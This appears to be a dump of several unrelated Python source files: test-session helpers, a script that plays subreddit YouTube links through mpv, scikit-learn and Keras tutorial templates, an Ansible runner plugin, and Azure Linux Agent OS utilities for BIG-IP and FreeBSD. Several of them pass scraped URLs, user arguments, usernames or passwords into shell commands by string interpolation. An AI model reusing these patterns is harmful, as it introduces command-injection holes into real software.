            except ClosedError:
                pass
        if self._listenerthread != threading.current_thread():
            self._listenerthread.join(timeout=1.0)
            if self._listenerthread.is_alive():
                warnings.warn('session listener still running')
        self._check_handlers()

    def _listen(self):
        try:
            for msg in self._conn.iter_messages():
                if self.VERBOSE:
                    print(' ->', msg)
                self._receive_message(msg)
        except EOFError:                    
            try:
                self.close()
            except ClosedError:
                pass

    def _receive_message(self, msg):
        for i, handler in enumerate(list(self._handlers)):
            handle_message, _, _ = handler
            handled = handle_message(msg)
            try:
                msg, handled = handled
            except TypeError:
                pass
            if handled:
                self._handlers.remove(handler)
                break
        self._received.append(msg)

    def _add_handler(self, handle_msg, handlername=None, required=True):
        self._handlers.append(
            (handle_msg, handlername, required))

    def _check_handlers(self):
        unhandled = []
        for handle_msg, name, required in self._handlers:
            if not required:
                continue
            unhandled.append(name or repr(handle_msg))
        if unhandled:
            raise RuntimeError('unhandled: {}'.format(unhandled))

    @contextlib.contextmanager
    def _wait_for_message(self, match, handlername, timeout=None):
        if timeout is None:
            timeout = self.TIMEOUT
        lock, wait = get_locked_and_waiter()

        def handler(msg):
            if not match(msg):
                return msg, False
            lock.release()
            return msg, True
        self._add_handler(handler, handlername)
        try:
            yield
        finally:
            wait(timeout or self._timeout, handlername, fail=True)

    def _get_message_handle(self, match, handlername):
        event = threading.Event()

        def handler(msg):
            if not match(msg):
                return msg, False
            event.set()
            return msg, True
        self._add_handler(handler, handlername, False)
        return event


class Awaitable(object):

    @classmethod
    def wait_all(cls, *awaitables):
        timeout = 3.0
        messages = []
        for _ in range(int(timeout * 10)):
            time.sleep(0.1)
            messages = []
            not_ready = (a for a in awaitables if a._event is not None and not a._event.is_set()) # noqa
            for awaitable in not_ready:
                if isinstance(awaitable, AwaitableEvent):
                    messages.append('Event {}'.format(awaitable.name))
                else:
                    messages.append('Response {}'.format(awaitable.name))
            if len(messages) == 0:
                return
        else:
            raise TimeoutError('Timeout waiting for {}'.format(','.join(messages))) # noqa

    def __init__(self, name, event=None):
        self._event = event
        self.name = name

    def wait(self, timeout=1.0):
        if self._event is None:
            return
        if not self._event.wait(timeout):
            message = 'Timeout waiting for '
            if isinstance(self, AwaitableEvent):
                message += 'Event {}'.format(self.name)
            else:
                message += 'Response {}'.format(self.name)
            raise TimeoutError(message)


class AwaitableResponse(Awaitable):

    def __init__(self, req, result_getter, event=None):
        super(AwaitableResponse, self).__init__(req["command"], event)
        self.req = req
        self._result_getter = result_getter

    @property
    def resp(self):
        return self._result_getter()


class AwaitableEvent(Awaitable):

    def __init__(self, name, result_getter, event=None):
        super(AwaitableEvent, self).__init__(name, event)
        self._result_getter = result_getter

    @property
    def event(self):
        return self._result_getter()

#!/usr/bin/env python3

################
# Imports
################

import os
import pickle
from bs4 import BeautifulSoup
import urllib3
import certifi
import re
import sys
import argparse as ap
#from argparse import ArgumentParser, REMINDER

################
# Functions
################

# Function to flatten a list
flatten = lambda l: [item for sublist in l for item in sublist]
# cheers to https://stackoverflow.com/a/952952

# Get and parse out links
def getytlinks(link):
    pm = urllib3.PoolManager(cert_reqs='CERT_REQUIRED',ca_certs=certifi.where())
    html_page = pm.request('GET', link)
    soup = BeautifulSoup(html_page.data, "lxml")
    links = [a.get('href') for a in soup('a') if a.get('href')]

    # Pick out youtube links
    new_links = [x for x in links if re.match("^https://youtu\.be", x)]
    newer_links = [x for x in links if re.match("^https://www\.youtube\.com/watch", x)]
    # the youtube.com links are not always well formatted for mpv, so we reformat them:
    for lk in newer_links:
        videolabel = re.search('v=([^&?]*)', lk)[1]
        if videolabel is None:
            print('Reddytt: skipping URL without video label:', lk)
            continue
        new_links.append('https://www.youtube.com/watch?v=' + videolabel)
    # in principal, add anything here you want. I guess all of these should work: https://rg3.github.io/youtube-dl/supportedsites.html
    return new_links, links

################
# Main
################

if __name__ == '__main__':

    parser = ap.ArgumentParser(usage='%(prog)s [options] <subreddit> [-- [mpv-arguments]]', description='Play the youtube links from your favourite subreddit.')

    parser.add_argument('--depth', metavar='d', type=int, default=0, help='How many pages into the subreddit you want to go.')
    parser.add_argument('subreddit', type=str, help='The subreddit you want to play.')
    parser.add_argument('mpv', nargs=ap.REMAINDER, help='Arguments to pass to `mpv`.')

    args = parser.parse_args()

    subreddit = args.subreddit
    depth = args.depth
    mpv = " ".join(args.mpv)                    

    subreddit_link = "https://reddit.com/r/" + subreddit

    # Setup working directory
    work_dir = os.environ['HOME'] + "/.reddytt"
    sr_dir = work_dir + "/%s" % subreddit
    seen_file = sr_dir + "/seen"
    seen_links = []
    unseen_file = sr_dir + "/unseen"
    unseen_links = []
    print("Reddytt: Checking for reddytt working directory (%s)." % work_dir)

    if not os.path.isdir(work_dir):
        print("Reddytt: Working directory not found. Creating %s, and files." % work_dir)
        os.mkdir(work_dir)
        os.mkdir(sr_dir)
        os.system("touch %s" % seen_file)
        with open(seen_file, 'wb') as f:
            pickle.dump(seen_links, f)
        os.system("touch %s" % unseen_file)
        with open(unseen_file, 'wb') as f:
            pickle.dump(unseen_links, f)
    elif not os.path.isdir(sr_dir):
        print("Reddytt: Working directory found, but no subreddit directory. Creating %s, and files." % sr_dir)
        os.mkdir(sr_dir)
        os.system("touch %s" % seen_file)
        with open(seen_file, 'wb') as f:
            pickle.dump(seen_links, f)
        os.system("touch %s" % unseen_file)
        with open(unseen_file, 'wb') as f:
            pickle.dump(unseen_links, f)
    else:
        print("Reddytt: Working directory found. Loading variables.")
        with open(seen_file, 'rb') as f:
            seen_links = pickle.load(f)
        with open(unseen_file, 'rb') as f:
            unseen_links = pickle.load(f)

    new_links, links = getytlinks(subreddit_link)

    # Go deeper
    if depth > 0:
        for d in range(depth):
            link = ""
            for l in links:
                if re.search("after=", l):
                    link = l
            if link == "":
                print("Reddytt: Could not identify 'after'-variable to progress deeper.")
            else:
                newer_links, links = getytlinks(link)
                new_links += newer_links
                new_links = list(set(new_links))

    # we also want to watch the stored ones
    new_links += unseen_links
    new_links = list(set(new_links))

    # Start watching
    save_links = new_links
    for link in new_links:
        if link in seen_links:
            print("Reddytt: Link seen. Skipping.")
        else:
            x = os.system("mpv %(args)s %(link)s" % {"link": link, "args": mpv})                    
            print("Reddytt: That was: %s" % link)
            if x == 0:                    
                # The video finished or you hit 'q' (or whatever your binding is), this is a good exit.
                # Store the video in seen_links.
                seen_links.append(link)
                save_links.remove(link)
            elif x == 1024:                    
                # You made a hard exit, and want to stop. (Ctrl+C)
                # Store the links and exit the program.
                print("Reddytt: Forced exit detected. Saving and exiting.")
                with open(seen_file, 'wb') as f:
                    pickle.dump(seen_links, f)
                with open(unseen_file, 'wb') as f:
                    pickle.dump(save_links, f)
                # Exit program.
                sys.exit()
            else:
                # Something else happened. Bad link perhaps.
                # Store in seen_links to avoid in the future.

                seen_links.append(link)
                save_links.remove(link)

    # The playlist is finished. Save everything.
    with open(seen_file, 'wb') as f:
        pickle.dump(seen_links, f)
    with open(unseen_file, 'wb') as f:
        pickle.dump(save_links, f)

# Classification template

# Importing the libraries
import numpy as np
import matplotlib.pyplot as plt
import pandas as pd

# Importing the dataset
dataset = pd.read_csv('Social_Network_Ads.csv')                    
X = dataset.iloc[:, [2, 3]].values
y = dataset.iloc[:, 4].values

# Splitting the dataset into the Training set and Test set
from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.25, random_state=0)

# Feature Scaling
from sklearn.preprocessing import StandardScaler

sc = StandardScaler()
X_train = sc.fit_transform(X_train)
X_test = sc.transform(X_test)

# Fitting classifier to the Training set
# Create your classifier here

# Predicting the Test set results
y_pred = classifier.predict(X_test)

# Making the Confusion Matrix
from sklearn.metrics import confusion_matrix
cm = confusion_matrix(y_test, y_pred)

# Visualising the Training set results
from matplotlib.colors import ListedColormap
X_set, y_set = X_train, y_train
X1, X2 = np.meshgrid(np.arange(start=X_set[:, 0].min() - 1, stop=X_set[:, 0].max() + 1, step=0.01),
                     np.arange(start=X_set[:, 1].min() - 1, stop=X_set[:, 1].max() + 1, step=0.01))
plt.contourf(X1, X2, classifier.predict(np.array([X1.ravel(), X2.ravel()]).T).reshape(X1.shape),
             alpha=0.75, cmap=ListedColormap(('red', 'green')))
plt.xlim(X1.min(), X1.max())
plt.ylim(X2.min(), X2.max())
for i, j in enumerate(np.unique(y_set)):
    plt.scatter(X_set[y_set == j, 0], X_set[y_set == j, 1],
                c = ListedColormap(('red', 'green'))(i), label = j)
plt.title('Classifier (Training set)')
plt.xlabel('Age')
plt.ylabel('Estimated Salary')
plt.legend()
plt.show()

# Visualising the Test set results
from matplotlib.colors import ListedColormap

X_set, y_set = X_test, y_test
X1, X2 = np.meshgrid(np.arange(start=X_set[:, 0].min() - 1, stop=X_set[:, 0].max() + 1, step=0.01),
                     np.arange(start=X_set[:, 1].min() - 1, stop=X_set[:, 1].max() + 1, step=0.01))
plt.contourf(X1, X2, classifier.predict(np.array([X1.ravel(), X2.ravel()]).T).reshape(X1.shape),
             alpha=0.75, cmap=ListedColormap(('red', 'green')))
plt.xlim(X1.min(), X1.max())
plt.ylim(X2.min(), X2.max())
for i, j in enumerate(np.unique(y_set)):
    plt.scatter(X_set[y_set == j, 0], X_set[y_set == j, 1],
                c=ListedColormap(('red', 'green'))(i), label=j)
plt.title('Classifier (Test set)')
plt.xlabel('Age')
plt.ylabel('Estimated Salary')
plt.legend()
plt.show()

# Data Preprocessing

# Importing the libraries
import numpy as np
import matplotlib.pyplot as plt
import pandas as pd

# Importing the dataset
dataset = pd.read_csv('Data.csv')                    
X = dataset.iloc[:, :-1].values
y = dataset.iloc[:, -1].values

# Artificial Neural Network

# Installing Theano
# pip install --upgrade --no-deps git+git://github.com/Theano/Theano.git

# Installing Tensorflow
# pip install tensorflow

# Installing Keras
# pip install --upgrade keras

# Part 1 - Data Preprocessing

# Importing the libraries
import numpy as np
import matplotlib.pyplot as plt
import pandas as pd

# Importing the dataset
dataset = pd.read_csv('Churn_Modelling.csv')                    
X = dataset.iloc[:, 3:13].values
y = dataset.iloc[:, 13].values

# Encoding categorical data
from sklearn.preprocessing import LabelEncoder, OneHotEncoder
labelencoder_X_1 = LabelEncoder()
X[:, 1] = labelencoder_X_1.fit_transform(X[:, 1])
labelencoder_X_2 = LabelEncoder()
X[:, 2] = labelencoder_X_2.fit_transform(X[:, 2])
onehotencoder = OneHotEncoder(categorical_features = [1])                    
X = onehotencoder.fit_transform(X).toarray()
X = X[:, 1:]

# Splitting the dataset into the Training set and Test set
from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)                    

# Feature Scaling
from sklearn.preprocessing import StandardScaler
sc = StandardScaler()
X_train = sc.fit_transform(X_train)
X_test = sc.transform(X_test)

# Part 2 - Now let's make the ANN!

# Importing the Keras libraries and packages
import keras
from keras.models import Sequential
from keras.layers import Dense

# Initialising the ANN
classifier = Sequential()

# Adding the input layer and the first hidden layer
classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu', input_dim = 11))                    

# Adding the second hidden layer
classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu'))                    

# Adding the output layer
classifier.add(Dense(units = 1, kernel_initializer = 'uniform', activation = 'sigmoid'))                    

# Compiling the ANN
classifier.compile(optimizer = 'adam', loss = 'binary_crossentropy', metrics = ['accuracy'])                    

# Fitting the ANN to the Training set
classifier.fit(X_train, y_train, batch_size = 10, epochs = 100)                    

# Part 3 - Making predictions and evaluating the model

# Predicting the Test set results
y_pred = classifier.predict(X_test)
y_pred = (y_pred > 0.5)

# Making the Confusion Matrix
from sklearn.metrics import confusion_matrix
cm = confusion_matrix(y_test, y_pred)

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (C) 2016 Red Hat, Inc
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

from ansible import inventory
from ansible import vars
from ansible.executor import playbook_executor
from ansible.parsing import dataloader

from ansible.utils.display import Display

from dciclient.v1 import helper as dci_helper
from dciagent.plugins import plugin


import jinja2
import os
import subprocess

display = Display()                    

class Options(object):
    def __init__(self, verbosity=None, inventory=None, listhosts=None, subset=None, module_paths=None, extra_vars=None,
                 forks=None, ask_vault_pass=None, vault_password_files=None, new_vault_password_file=None,
                 output_file=None, tags=None, skip_tags=None, one_line=None, tree=None, ask_sudo_pass=None, ask_su_pass=None,
                 sudo=None, sudo_user=None, become=None, become_method=None, become_user=None, become_ask_pass=None,
                 ask_pass=None, private_key_file=None, remote_user=None, connection=None, timeout=None, ssh_common_args=None,
                 sftp_extra_args=None, scp_extra_args=None, ssh_extra_args=None, poll_interval=None, seconds=None, check=None,
                 syntax=None, diff=None, force_handlers=None, flush_cache=None, listtasks=None, listtags=None, module_path=None):
        self.verbosity = verbosity
        self.inventory = inventory
        self.listhosts = listhosts
        self.subset = subset
        self.module_paths = module_paths
        self.extra_vars = extra_vars
        self.forks = forks
        self.ask_vault_pass = ask_vault_pass
        self.vault_password_files = vault_password_files
        self.new_vault_password_file = new_vault_password_file
        self.output_file = output_file
        self.tags = tags
        self.skip_tags = skip_tags
        self.one_line = one_line
        self.tree = tree
        self.ask_sudo_pass = ask_sudo_pass
        self.ask_su_pass = ask_su_pass
        self.sudo = sudo
        self.sudo_user = sudo_user
        self.become = become
        self.become_method = become_method
        self.become_user = become_user
        self.become_ask_pass = become_ask_pass
        self.ask_pass = ask_pass
        self.private_key_file = private_key_file
        self.remote_user = remote_user
        self.connection = connection
        self.timeout = timeout
        self.ssh_common_args = ssh_common_args
        self.sftp_extra_args = sftp_extra_args
        self.scp_extra_args = scp_extra_args
        self.ssh_extra_args = ssh_extra_args
        self.poll_interval = poll_interval
        self.seconds = seconds
        self.check = check
        self.syntax = syntax
        self.diff = diff
        self.force_handlers = force_handlers
        self.flush_cache = flush_cache
        self.listtasks = listtasks
        self.listtags = listtags
        self.module_path = module_path


class Runner(object):

    def __init__(self, playbook, options=None, verbosity=0):

        if options is None:
            self.options = Options()
            self.options.verbosity = verbosity

        self.loader = dataloader.DataLoader()
        self.variable_manager = vars.VariableManager()

        self.inventory = inventory.Inventory(
            loader=self.loader,
            variable_manager=self.variable_manager,
            host_list='/etc/ansible/hosts'
        )
        self.variable_manager.set_inventory(self.inventory)

        # Playbook to run, from the current working directory.
        pb_dir = os.path.abspath('.')
        playbook_path = "%s/%s" % (pb_dir, playbook)
        display.verbosity = self.options.verbosity                    

        self.pbex = playbook_executor.PlaybookExecutor(
            #playbooks=[playbook_path],
            playbooks=[playbook],
            inventory=self.inventory,
            variable_manager=self.variable_manager,
            loader=self.loader,
            options=self.options,
            passwords={})

    def run(self, job_id):
        """Run the playbook and returns the playbook's stats."""
        self.variable_manager.extra_vars = {'job_id': job_id}
        self.pbex.run()
        return self.pbex._tqm._stats


class AnsiblePlugin(plugin.Plugin):

    def __init__(self, conf):
        super(AnsiblePlugin, self).__init__(conf)


    def generate_ansible_playbook_from_template(self, template_file, data):

        templateLoader = jinja2.FileSystemLoader( searchpath="/" )
        templateEnv = jinja2.Environment( loader=templateLoader )
        template = templateEnv.get_template( template_file )
        outputText = template.render( data )

        return outputText





    def run(self, state, data=None, context=None):
        """Run ansible-playbook on the specified playbook. """

        playbook = None
        log_file = None
        template = None

        if state in self.conf:
            if 'playbook' in self.conf[state]:
                playbook = self.conf[state]['playbook']
            if 'log_file' in self.conf[state]:
                log_file = self.conf[state]['log_file']
            if 'template' in self.conf[state]:
                template = self.conf[state]['template']

        if playbook is None:
            playbook = self.conf['playbook']
        if template is None and template in self.conf:
            template = self.conf['template']

        if log_file is None:
            if 'log_file' in self.conf:
                log_file = self.conf['log_file']
            else:
                log_file = open(os.devnull, 'w')

        if template:
            open(playbook, 'w').write(
                self.generate_ansible_playbook_from_template(template, data)
            )
            
        runner = Runner(playbook=playbook, verbosity=0)
        stats = runner.run(job_id=context.last_job_id)

# Copyright 2016 F5 Networks Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Requires Python 2.6+ and Openssl 1.0+
#

import array
import fcntl
import os
import platform
import re
import socket
import struct
import time

try:
    # WAAgent > 2.1.3
    import azurelinuxagent.common.logger as logger
    import azurelinuxagent.common.utils.shellutil as shellutil

    from azurelinuxagent.common.exception import OSUtilError
    from azurelinuxagent.common.osutil.default import DefaultOSUtil
except ImportError:
    # WAAgent <= 2.1.3
    import azurelinuxagent.logger as logger
    import azurelinuxagent.utils.shellutil as shellutil

    from azurelinuxagent.exception import OSUtilError
    from azurelinuxagent.distro.default.osutil import DefaultOSUtil


class BigIpOSUtil(DefaultOSUtil):
    def __init__(self):
        super(BigIpOSUtil, self).__init__()

    def _wait_until_mcpd_is_initialized(self):
        """Wait for mcpd to become available

        All configuration happens in mcpd so we need to wait that this is
        available before we go provisioning the system. I call this method
        at the first opportunity I have (during the DVD mounting call).
        This ensures that the rest of the provisioning does not need to wait
        for mcpd to be available unless it absolutely wants to.

        :return bool: Returns True upon success
        :raises OSUtilError: Raises exception if mcpd does not come up within
                             roughly 50 minutes (100 * 30 seconds)
        """
        for retries in range(1, 100):
            # Retry until mcpd completes startup:
            logger.info("Checking to see if mcpd is up")
            rc = shellutil.run("/usr/bin/tmsh -a show sys mcp-state field-fmt 2>/dev/null | grep phase | grep running", chk_err=False)
            if rc == 0:
                logger.info("mcpd is up!")
                break
            time.sleep(30)

        if rc is 0:
            return True

        raise OSUtilError(
            "mcpd hasn't completed initialization! Cannot proceed!"
        )

    def _save_sys_config(self):
        cmd = "/usr/bin/tmsh save sys config"
        rc = shellutil.run(cmd)
        if rc != 0:
            logger.error("WARNING: Cannot save sys config on 1st boot.")
        return rc

    def restart_ssh_service(self):
        return shellutil.run("/usr/bin/bigstart restart sshd", chk_err=False)

    def stop_agent_service(self):
        return shellutil.run("/sbin/service waagent stop", chk_err=False)

    def start_agent_service(self):
        return shellutil.run("/sbin/service waagent start", chk_err=False)

    def register_agent_service(self):
        return shellutil.run("/sbin/chkconfig --add waagent", chk_err=False)

    def unregister_agent_service(self):
        return shellutil.run("/sbin/chkconfig --del waagent", chk_err=False)

    def get_dhcp_pid(self):
        ret = shellutil.run_get_output("/sbin/pidof dhclient")
        return ret[1] if ret[0] == 0 else None

    def set_hostname(self, hostname):
        """Set the static hostname of the device

        Normally, tmsh is used to set the hostname for the system. For our
        purposes at this time though, I would hesitate to trust this function.

        Azure(Stack) uses the name that you provide in the Web UI or ARM (for
        example) as the value of the hostname argument to this method. The
        problem is that there is nowhere in the UI that specifies the
        restrictions and checks that tmsh has for the hostname.

        For example, if you set the name "bigip1" in the Web UI, Azure(Stack)
        considers that a perfectly valid name. When WAAgent gets around to
        running though, tmsh will reject that value because it is not a fully
        qualified domain name. The proper value should have been bigip.xxx.yyy

        WAAgent will not fail if this command fails, but the hostname will not
        be what the user set either. Currently we do not set the hostname when
        WAAgent starts up, so I am passing on setting it here too.

        :param hostname: The hostname to set on the device
        """
        return None

    def set_dhcp_hostname(self, hostname):
        """Sets the DHCP hostname

        See `set_hostname` for an explanation of why I pass here

        :param hostname: The hostname to set on the device
        """
        return None

    def useradd(self, username, expiration=None):                    
        """Create user account using tmsh

        Our policy is to create two accounts when booting a BIG-IP instance.
        The first account is the one that the user specified when they did
        the instance creation. The second one is the admin account that is,
        or should be, built in to the system.

        :param username: The username that you want to add to the system
        :param expiration: The expiration date to use. We do not use this
                           value.
        """
        if self.get_userentry(username):
            logger.info("User {0} already exists, skip useradd", username)
            return None

        cmd = "/usr/bin/tmsh create auth user %s partition-access add { all-partitions { role admin } } shell bash" % (username)
        retcode, out = shellutil.run_get_output(cmd, log_cmd=True, chk_err=True)
        if retcode != 0:
            raise OSUtilError(
                "Failed to create user account:{0}, retcode:{1}, output:{2}".format(username, retcode, out)
            )
        self._save_sys_config()
        return retcode

    def chpasswd(self, username, password, crypt_id=6, salt_len=10):
        """Change a user's password with tmsh

        Since we are creating the user specified account and additionally
        changing the password of the built-in 'admin' account, both must
        be modified in this method.

        Note that the default method also checks for a "system level" of the
        user; based on the value of UID_MIN in /etc/login.defs. In our env,
        all user accounts have the UID 0. So we can't rely on this value.

        :param username: The username whose password to change
        :param password: The unencrypted password to set for the user
        :param crypt_id: If encrypting the password, the crypt_id that was used
        :param salt_len: If encrypting the password, the length of the salt
                         value used to do it.
        """

        # Start by setting the password of the user provided account
        cmd = "/usr/bin/tmsh modify auth user {0} password '{1}'".format(username, password)
        ret, output = shellutil.run_get_output(cmd, log_cmd=False, chk_err=True)
        if ret != 0:
            raise OSUtilError(
                "Failed to set password for {0}: {1}".format(username, output)
            )

        # Next, set the password of the built-in 'admin' account to be have
        # the same password as the user provided account
        userentry = self.get_userentry('admin')
        if userentry is None:
            raise OSUtilError("The 'admin' user account was not found!")

        cmd = "/usr/bin/tmsh modify auth user 'admin' password '{0}'".format(password)
        ret, output = shellutil.run_get_output(cmd, log_cmd=False, chk_err=True)
        if ret != 0:
            raise OSUtilError(
                "Failed to set password for 'admin': {0}".format(output)
            )
        self._save_sys_config()
        return ret

    def del_account(self, username):
        """Deletes a user account.

        Note that the default method also checks for a "system level" of the
        user; based on the value of UID_MIN in /etc/login.defs. In our env,
        all user accounts have the UID 0. So we can't rely on this value.

        We also don't use sudo, so we remove that method call as well.

        :param username:
        :return:
        """
        shellutil.run("> /var/run/utmp")
        shellutil.run("/usr/bin/tmsh delete auth user " + username)

    def get_dvd_device(self, dev_dir='/dev'):
        """Find BIG-IP's CD/DVD device

        This device is almost certainly /dev/cdrom so I added the ? to this pattern.
        Note that this method will return upon the first device found, but in my
        tests with 12.1.1 it will also find /dev/sr0 on occasion. This is NOT the
        correct CD/DVD device though.

        :todo: Consider just always returning "/dev/cdrom" here if that device device
               exists on all platforms that are supported on Azure(Stack)
        :param dev_dir: The root directory from which to look for devices
        """
        patten = r'(sr[0-9]|hd[c-z]|cdrom[0-9]?)'
        for dvd in [re.match(patten, dev) for dev in os.listdir(dev_dir)]:
            if dvd is not None:
                return "/dev/{0}".format(dvd.group(0))
        raise OSUtilError("Failed to get dvd device")

    def mount_dvd(self, **kwargs):
        """Mount the DVD containing the provisioningiso.iso file

        This is the _first_ hook that WAAgent provides for us, so this is the
        point where we should wait for mcpd to load. I am just overloading
        this method to add the mcpd wait. Then I proceed with the stock code.

        :param max_retry: Maximum number of retries waagent will make when
                          mounting the provisioningiso.iso DVD
        :param chk_err: Whether to check for errors or not in the mounting
                        commands
        """
        self._wait_until_mcpd_is_initialized()
        return super(BigIpOSUtil, self).mount_dvd(**kwargs)

    def eject_dvd(self, chk_err=True):
        """Runs the eject command to eject the provisioning DVD

        BIG-IP does not include an eject command. It is sufficient to just
        umount the DVD disk. But I will log that we do not support this for
        future reference.

        :param chk_err: Whether or not to check for errors raised by the eject
                        command
        """
        logger.warn("Eject is not supported on this platform")

    def get_first_if(self):
        """Return the interface name, and ip addr of the management interface.

        We need to add a struct_size check here because, curiously, our 64bit
        platform is identified by python in Azure(Stack) as 32 bit and without
        adjusting the struct_size, we can't get the information we need.

        I believe this may be caused by only python i686 being shipped with
        BIG-IP instead of python x86_64??
        """
        iface = ''
        expected = 16  # how many devices should I expect...

        python_arc = platform.architecture()[0]
        if python_arc == '64bit':
            struct_size = 40  # for 64bit the size is 40 bytes
        else:
            struct_size = 32  # for 32bit the size is 32 bytes
        sock = socket.socket(socket.AF_INET,
                             socket.SOCK_DGRAM,
                             socket.IPPROTO_UDP)
        buff = array.array('B', b'\0' * (expected * struct_size))
        param = struct.pack('iL',
                            expected*struct_size,
                            buff.buffer_info()[0])
        ret = fcntl.ioctl(sock.fileno(), 0x8912, param)
        retsize = (struct.unpack('iL', ret)[0])
        if retsize == (expected * struct_size):
            logger.warn(('SIOCGIFCONF returned more than {0} up '
                         'network interfaces.'), expected)
        sock = buff.tostring()
        for i in range(0, struct_size * expected, struct_size):
            iface = self._format_single_interface_name(sock, i)

            # Azure public was returning "lo:1" when deploying WAF
            if b'lo' in iface:
                continue
            else:
                break
        return iface.decode('latin-1'), socket.inet_ntoa(sock[i+20:i+24])

    def _format_single_interface_name(self, sock, offset):
        return sock[offset:offset+16].split(b'\0', 1)[0]

    def route_add(self, net, mask, gateway):
        """Add specified route using tmsh.

        :param net:
        :param mask:
        :param gateway:
        :return:
        """
        cmd = ("/usr/bin/tmsh create net route "
               "{0}/{1} gw {2}").format(net, mask, gateway)
        return shellutil.run(cmd, chk_err=False)

    def device_for_ide_port(self, port_id):
        """Return device name attached to ide port 'n'.

        Include a wait in here because BIG-IP may not have yet initialized
        this list of devices.

        :param port_id:
        :return:
        """
        for retries in range(1, 100):
            # Retry until devices are ready
            if os.path.exists("/sys/bus/vmbus/devices/"):
                break
            else:
                time.sleep(10)
        return super(BigIpOSUtil, self).device_for_ide_port(port_id)

# Microsoft Azure Linux Agent
#
# Copyright 2018 Microsoft Corporation
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Requires Python 2.6+ and Openssl 1.0+

import azurelinuxagent.common.utils.fileutil as fileutil
import azurelinuxagent.common.utils.shellutil as shellutil
import azurelinuxagent.common.utils.textutil as textutil
import azurelinuxagent.common.logger as logger
from azurelinuxagent.common.exception import OSUtilError
from azurelinuxagent.common.osutil.default import DefaultOSUtil
from azurelinuxagent.common.future import ustr

class FreeBSDOSUtil(DefaultOSUtil):
    def __init__(self):
        super(FreeBSDOSUtil, self).__init__()
        self._scsi_disks_timeout_set = False

    def set_hostname(self, hostname):
        rc_file_path = '/etc/rc.conf'
        conf_file = fileutil.read_file(rc_file_path).split("\n")
        textutil.set_ini_config(conf_file, "hostname", hostname)
        fileutil.write_file(rc_file_path, "\n".join(conf_file))
        shellutil.run("hostname {0}".format(hostname), chk_err=False)

    def restart_ssh_service(self):
        return shellutil.run('service sshd restart', chk_err=False)

    def useradd(self, username, expiration=None):                    
        """
        Create user account with 'username'
        """
        userentry = self.get_userentry(username)
        if userentry is not None:
            logger.warn("User {0} already exists, skip useradd", username)
            return

        if expiration is not None:
            cmd = "pw useradd {0} -e {1} -m".format(username, expiration)
        else:
            cmd = "pw useradd {0} -m".format(username)
        retcode, out = shellutil.run_get_output(cmd)
        if retcode != 0:
            raise OSUtilError(("Failed to create user account:{0}, "
                               "retcode:{1}, "
                               "output:{2}").format(username, retcode, out))

    def del_account(self, username):
        if self.is_sys_user(username):
            logger.error("{0} is a system user. Will not delete it.", username)
        shellutil.run('> /var/run/utx.active')
        shellutil.run('rmuser -y ' + username)
        self.conf_sudoer(username, remove=True)

    def chpasswd(self, username, password, crypt_id=6, salt_len=10):
        if self.is_sys_user(username):
            raise OSUtilError(("User {0} is a system user, "
                               "will not set password.").format(username))
        passwd_hash = textutil.gen_password_hash(password, crypt_id, salt_len)
        cmd = "echo '{0}'|pw usermod {1} -H 0 ".format(passwd_hash, username)
        ret, output = shellutil.run_get_output(cmd, log_cmd=False)
        if ret != 0:
            raise OSUtilError(("Failed to set password for {0}: {1}"
                               "").format(username, output))

    def del_root_password(self):
        err = shellutil.run('pw usermod root -h -')
        if err:
            raise OSUtilError("Failed to delete root password: Failed to update password database.")

    def get_if_mac(self, ifname):
        data = self._get_net_info()
        if data[0] == ifname:
            return data[2].replace(':', '').upper()
        return None

    def get_first_if(self):
        return self._get_net_info()[:2]

    def route_add(self, net, mask, gateway):
        cmd = 'route add {0} {1} {2}'.format(net, gateway, mask)
        return shellutil.run(cmd, chk_err=False)

    def is_missing_default_route(self):
        """
        For FreeBSD, the default broadcast goes to current default gw, not a all-ones broadcast address, need to
        specify the route manually to get it work in a VNET environment.
        SEE ALSO: man ip(4) IP_ONESBCAST,
        """
        return True

    def is_dhcp_enabled(self):
        return True

    def start_dhcp_service(self):
        shellutil.run("/etc/rc.d/dhclient start {0}".format(self.get_if_name()), chk_err=False)

    def allow_dhcp_broadcast(self):
        pass

    def set_route_for_dhcp_broadcast(self, ifname):
        return shellutil.run("route add 255.255.255.255 -iface {0}".format(ifname), chk_err=False)

    def remove_route_for_dhcp_broadcast(self, ifname):
        shellutil.run("route delete 255.255.255.255 -iface {0}".format(ifname), chk_err=False)

    def get_dhcp_pid(self):
        ret = shellutil.run_get_output("pgrep -n dhclient", chk_err=False)
        return ret[1] if ret[0] == 0 else None

    def eject_dvd(self, chk_err=True):
        dvd = self.get_dvd_device()
        retcode = shellutil.run("cdcontrol -f {0} eject".format(dvd))
        if chk_err and retcode != 0:
            raise OSUtilError("Failed to eject dvd: ret={0}".format(retcode))

    def restart_if(self, ifname):
        # Restart dhclient only to publish hostname
        shellutil.run("/etc/rc.d/dhclient restart {0}".format(ifname), chk_err=False)

    def get_total_mem(self):
        cmd = "sysctl hw.physmem |awk '{print $2}'"
        ret, output = shellutil.run_get_output(cmd)
        if ret:
            raise OSUtilError("Failed to get total memory: {0}".format(output))
        try:
            return int(output)/1024/1024
